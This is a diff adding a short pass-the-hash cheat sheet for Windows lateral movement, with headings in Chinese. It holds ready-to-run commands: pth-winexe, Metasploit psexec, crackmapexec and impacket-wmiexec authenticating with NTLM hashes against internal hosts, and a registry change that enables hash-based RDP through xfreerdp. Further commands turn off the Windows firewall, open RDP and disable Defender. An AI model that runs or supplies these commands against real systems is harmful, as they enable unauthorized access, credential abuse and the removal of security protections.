@@ -1,0 +1,26 @@
+# PtH
+pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063716ab7fe2a11faf126d8 //10.0.2.68 cmd
+
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit(psexec) > exploit
+
+crackmapexec smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local
+crackmapexec smb -d . -u yuanfh -p vv -x "cmd /c dir c:\\" 10.0.2.68
+
+impacket-wmiexec yuanfh@10.0.2.68 -hashes aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063716ab7fe2a11faf126d8
+
+# 远程桌面（关闭限制模式）
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
+
+# 关闭防火墙
+netsh advfirewall set allprofiles state off
+Netsh Advfirewall show allprofiles
+
+# 开启RDP
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+# 临时关闭 Defender
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+gpupdate /force
